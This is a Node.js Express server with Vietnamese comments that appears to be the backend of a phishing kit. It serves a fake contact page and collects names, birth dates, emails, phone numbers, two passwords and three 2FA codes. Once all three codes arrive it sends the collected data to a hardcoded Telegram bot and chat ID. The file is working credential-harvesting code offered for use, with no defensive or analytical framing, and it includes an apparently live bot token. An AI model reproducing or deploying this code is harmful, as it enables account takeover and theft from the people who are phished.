const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const CryptoJS = require('crypto-js');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));
app.use('/_next', express.static(path.join(__dirname, '_next')));

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8932332118:AAHhk28Z1nLEgYaEk6Rbh4o0gJ-WQvDlvwY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7213546758';
const SECRET_KEY = "HDNDT-JDHT8FNEK-JJHR";

// Lưu dữ liệu tạm theo IP
const sessionData = new Map();

function decryptData(encryptedData) {
  try {
    const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
    const decrypted = bytes.toString(CryptoJS.enc.Utf8);
    if (!decrypted) return null;
    return JSON.parse(decrypted);
  } catch (error) {
    console.error('Giải mã lỗi:', error.message);
    return null;
  }
}

async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });
    console.log('✅ Đã gửi tin nhắn!');
  } catch (error) {
    console.error('❌ Lỗi gửi:', error.message);
  }
}

// Hàm format tin nhắn theo định dạng YÊU CẦU
function formatFinalMessage(data) {
  // Lấy OTP theo đúng thứ tự
  const otp1 = data.twoFa || data.code2FA1 || data.otp1 || 'N/A';
  const otp2 = data.twoFaSecond || data.code2FA2 || data.otp2 || 'N/A';
  const otp3 = data.twoFaThird || data.code2FA3 || data.otp3 || 'N/A';
  
  // Format chuẩn như yêu cầu
  return `
Ip: ${data.ip || 'N/A'}
Location: ${data.location || 'N/A'}
-----------------------------
Full Name: ${data.name || data.fullName || 'N/A'}
Page Name: ${data.fanpage || data.fanpageUrl || 'N/A'}
Date of birth: ${data.day || 'N/A'}/${data.month || 'N/A'}/${data.year || 'N/A'}
-----------------------------
Email: ${data.email || 'N/A'}
Email Business: ${data.business || data.businessEmail || 'N/A'}
Phone Number: ${data.phone || 'N/A'}
-----------------------------
Password First: ${data.password || data.passwordFirst || 'N/A'}
Password Second: ${data.passwordSecond || 'N/A'}
-----------------------------
Auth Method: ${data.authMethod || 'N/A'}
-----------------------------
🔐Code 2FA(1): ${otp1}
🔐Code 2FA(2): ${otp2}
🔐Code 2FA(3): ${otp3}
  `.trim();
}

// API chính
app.post('/api/authentication', async (req, res) => {
  try {
    let data = req.body;
    
    // Giải mã nếu cần
    if (data.data && typeof data.data === 'string') {
      const decrypted = decryptData(data.data);
      if (decrypted) data = decrypted;
    }
    
    // Lấy IP làm key
    const clientIp = data.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
    
    // Lấy dữ liệu cũ hoặc tạo mới
    let existingData = sessionData.get(clientIp) || {};
    
    // Gộp dữ liệu mới
    const mergedData = { ...existingData, ...data };
    sessionData.set(clientIp, mergedData);
    
    // Lấy OTP từ dữ liệu đã gộp
    const otp1 = mergedData.twoFa || mergedData.code2FA1 || mergedData.otp1;
    const otp2 = mergedData.twoFaSecond || mergedData.code2FA2 || mergedData.otp2;
    const otp3 = mergedData.twoFaThird || mergedData.code2FA3 || mergedData.otp3;
    
    // Kiểm tra đã có đủ 3 OTP chưa
    const hasAllOTP = otp1 && otp2 && otp3;
    
    // Kiểm tra đã có thông tin cơ bản chưa
    const hasPersonalInfo = mergedData.name && mergedData.email && mergedData.phone;
    const hasPassword = mergedData.password || mergedData.passwordFirst;
    
    console.log(`📋 IP: ${clientIp}`);
    console.log(`   Personal: ${!!hasPersonalInfo}, Password: ${!!hasPassword}, OTP1: ${!!otp1}, OTP2: ${!!otp2}, OTP3: ${!!otp3}`);
    
    // CHỈ GỬI KHI CÓ ĐỦ CẢ 3 OTP
    if (hasPersonalInfo && hasPassword && hasAllOTP) {
      console.log('✅ Đã có đủ 3 OTP! Gửi tin nhắn tổng hợp...');
      
      const finalMessage = formatFinalMessage(mergedData);
      await sendToTelegram(finalMessage);
      
      // Xóa dữ liệu sau khi gửi
      sessionData.delete(clientIp);
      
      res.json({ success: true, message: "Hoàn tất!" });
    } else {
      console.log(`⏳ Chưa đủ dữ liệu (còn thiếu OTP: ${!otp1 ? '1' : ''} ${!otp2 ? '2' : ''} ${!otp3 ? '3' : ''})`);
      res.json({ success: true, message: "Đã lưu thông tin, tiếp tục..." });
    }
    
  } catch (error) {
    console.error('Lỗi:', error);
    res.status(500).json({ success: false });
  }
});

// Route cho file HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'contact.html'));
});

app.get('/contact.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'contact.html'));
});

app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════════════╗
║   🚀 SERVER ĐÃ CHẠY!                                         ║
╠═══════════════════════════════════════════════════════════════╣
║   PORT: ${PORT}                                                  ║
║   Web: http://localhost:${PORT}/contact.html                    ║
║                                                                 ║
║   ⭐ CHỈ gửi 1 tin nhắn khi có ĐỦ 3 OTP!                      ║
╚═══════════════════════════════════════════════════════════════╝
  `);
});